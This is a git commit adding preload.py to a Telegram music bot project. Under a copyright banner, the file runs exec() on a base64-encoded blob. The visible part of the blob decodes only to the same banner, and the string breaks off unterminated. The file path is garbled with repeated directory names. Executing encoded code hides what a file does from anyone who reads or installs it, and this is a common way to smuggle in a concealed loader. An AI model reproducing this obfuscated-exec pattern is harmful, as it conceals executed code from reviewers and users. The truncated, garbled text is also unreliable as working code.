b99d88c9453d34a1a8171fd4837c7f1e7498c140
mgbnotfree-creator <mgbnotfree@gmail.com>
2026-09-11 18:10:45 +0530

    create preload.py

---
+++ Elevenyts/core/Elevenyts/core/Elevenyts/core/Elevenyts/core/Elevenyts/core/Elevenyts/core/preload.py
@@ -0,0 +1,18 @@
+# ==========================================================
+# Copyright (c) 2026 MGB Not Free Creator 
+# All Rights Reserved.
+#
+# Project      : MGB Not Free Music Telegram Bot
+# Powered By   : MGB Not Free Creator
+# Type         : API Based Telegram Music Bot
+#
+# Bot          : @MUSIC1_NOT_FREE_BOT
+# Channel      : https://t.me/MUSIC_SUPPORT_69
+# GitHub       : https://github.com/mgbnotfree-creator/MGB_NOT_FREE_MUSIC
+#
+# Unauthorized copying, modification, or redistribution
+# of this source code without permission is prohibited.
+# ==========================================================
+import base64
+exec(base64.b64decode("IyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgQ29weXJpZ2h0IChjKSAyMDI2IE1HQiBOb3QgRnJlZSBDcmVhdG9yIAojIEFsbCBSaWdodHMgUmVzZXJ2ZWQuCiMKIyBQcm9qZWN0ICAgICAgOiBNR0IgTm90IEZyZWUgTXVzaWMgVGVsZWdyYW0gQm90CiMgUG93ZXJlZCBCeSAgIDogTUdCIE5vdCBGcmVlIENyZWF0b3IKIz
+                      
